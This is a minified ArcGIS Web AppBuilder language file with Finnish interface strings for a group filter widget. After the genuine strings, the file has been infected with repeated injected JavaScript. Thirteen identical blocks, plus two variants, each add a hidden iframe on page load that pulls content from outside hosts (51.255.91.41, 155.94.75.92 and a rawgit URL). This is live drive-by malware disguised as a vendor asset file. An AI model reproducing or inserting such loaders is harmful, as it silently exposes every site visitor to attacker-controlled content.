// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/GroupFilter/setting/nls/strings":{configText:"M\u00e4\u00e4rit\u00e4 suodatinryhm\u00e4si alla",labels:{groupName:"Suodatinjoukon nimi:",groupNameTip:"Sen suodattimen nimi, josta k\u00e4ytt\u00e4j\u00e4 valitsee.",groupDesc:"Kuvaus:",groupDescTip:"Suodatinjoukon kuvaus.",groupOperator:"Esiasetettu operaattori:",groupOperatorTip:"Asetus m\u00e4\u00e4ritt\u00e4\u00e4 etuk\u00e4teen suodattimen operaattorin. Jos esiasetettua operaattoria ei valita, suodatin k\u00e4ytt\u00e4\u00e4 Yht\u00e4 suuri kuin -operaattoria.",
groupDefault:"Esiasetettu arvo:",groupDefaultTip:"Asetus valitsee arvon olemassa olevasta karttatasosta.",sameLayerAppend:"Kun karttataso luetellaan useammin kuin kerran, k\u00e4yt\u00e4 seuraavaa operaattoria kenttien v\u00e4lill\u00e4:",sameLayerConjunc:"Liit\u00e4 seuraavan avulla:"},buttons:{addNewGroup:"Lis\u00e4\u00e4 uusi ryhm\u00e4",addNewGroupTip:"Lis\u00e4\u00e4 uusi suodatinjoukko.",addLayer:"Lis\u00e4\u00e4 karttataso",addLayerTip:"Lis\u00e4\u00e4 karttataso suodatinjoukkoon."},inputs:{groupName:"Anna ryhm\u00e4llesi nimi",
groupDesc:"Ryhm\u00e4si kuvaus",groupDefault:"Anna ennalta m\u00e4\u00e4ritetty arvo",simpleMode:"Aloita yksinkertaisessa n\u00e4kym\u00e4ss\u00e4",simpleModeTip:"Asetus yksinkertaistaa m\u00e4\u00e4ritetty\u00e4 pienoisohjelman liittym\u00e4\u00e4. Kun valintaruutu valitaan, liittym\u00e4st\u00e4 poistetaan operaattorien avattava luettelo ja ehtojen lis\u00e4yspainikkeet.",webmapAppendMode:"Liit\u00e4 suodatin olemassa olevaan web-kartan suodattimeen seuraavan avulla: ",webmapAppendModeTip:"Asetus liitt\u00e4\u00e4 suodatinjoukon olemassa olevaan web-kartan suodattimeen. Tuettuja operaattoreita ovat OR ja AND.",
persistOnClose:"S\u00e4ilyy pienoisohjelman sulkemisen j\u00e4lkeen",optionsMode:"Piilota pienoisohjelman asetukset",optionsModeTip:"Asetus tuo n\u00e4kyviin pienoisohjelman lis\u00e4asetukset. Jos valintaruutu valitaan, liittym\u00e4st\u00e4 poistetaan m\u00e4\u00e4ritettyjen suodattimien tallennus ja lataus sek\u00e4 suodattimen s\u00e4ilytt\u00e4minen pienoisohjelman sulkemisen j\u00e4lkeen.",optionOR:"TAI",optionAND:"JA",optionEQUAL:"YHT\u00c4 SUURI KUIN",optionNOTEQUAL:"EI YHT\u00c4 SUURI KUIN",
optionGREATERTHAN:"SUUREMPI KUIN",optionGREATERTHANEQUAL:"SUUREMPI TAI YHT\u00c4 SUURI KUIN",optionLESSTHAN:"PIENEMPI KUIN",optionLESSTHANEQUAL:"PIENEMPI TAI YHT\u00c4 SUURI KUIN",optionSTART:"ALKAA MERKILL\u00c4",optionEND:"P\u00c4\u00c4TTYY MERKKIIN",optionLIKE:"SIS\u00c4LT\u00c4\u00c4",optionNOTLIKE:"EI SIS\u00c4LL\u00c4",optionONORBEFORE:"ON TIETTYN\u00c4 P\u00c4IV\u00c4N\u00c4 TAI SIT\u00c4 ENNEN",optionONORAFTER:"ON TIETTYN\u00c4 P\u00c4IV\u00c4N\u00c4 TAI SEN J\u00c4LKEEN",optionNONE:"EI MIT\u00c4\u00c4N"},
tables:{layer:"Karttatasot",layerTip:"Karttatason nimi karttaan m\u00e4\u00e4ritetyss\u00e4 muodossa.",field:"Kent\u00e4t",fieldTip:"Kentt\u00e4, jonka perusteella karttataso suodatetaan.",value:"K\u00e4yt\u00e4 arvoa",valueTip:"Asetus ottaa k\u00e4ytt\u00f6\u00f6n karttatason arvojen avattavan luettelon. Jos mik\u00e4\u00e4n karttataso ei k\u00e4yt\u00e4 t\u00e4t\u00e4 parametria, k\u00e4ytt\u00e4j\u00e4 n\u00e4kee vain tekstiruudun.",zoom:"Tarkennus",zoomTip:"Asetus zoomaa kohteiden laajuuteen suodattimen k\u00e4yt\u00f6n j\u00e4lkeen. Valittavissa on vain yksi zoomattava karttataso.",
action:"Poista",actionTip:"Poista karttataso suodatinjoukosta."},popup:{label:"Valitse arvo"},errors:{noGroups:"Tarvitset v\u00e4hint\u00e4\u00e4n yhden ryhm\u00e4n.",noGroupName:"V\u00e4hint\u00e4\u00e4n yhden ryhm\u00e4n nimi puuttuu.",noDuplicates:"V\u00e4hint\u00e4\u00e4n yhden ryhm\u00e4n nimi on kaksoiskappale.",noRows:"Tarvitset taulukkoon v\u00e4hint\u00e4\u00e4n yhden rivin.",noLayers:"Kartassasi ei ole karttatasoja."},picker:{description:"K\u00e4yt\u00e4 t\u00e4t\u00e4 lomaketta esiasetetun arvon hakemiseen t\u00e4lle ryhm\u00e4lle.",
layer:"Valitse karttataso",layerTip:"Karttatason nimi web-karttaan m\u00e4\u00e4ritetyss\u00e4 muodossa.",field:"Valitse kentt\u00e4",fieldTip:"Kentt\u00e4, josta esiasetettu arvo m\u00e4\u00e4ritet\u00e4\u00e4n.",value:"Valitse arvo",valueTip:"Arvo, jota k\u00e4ytet\u00e4\u00e4n pienoisohjelman oletuksena."},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});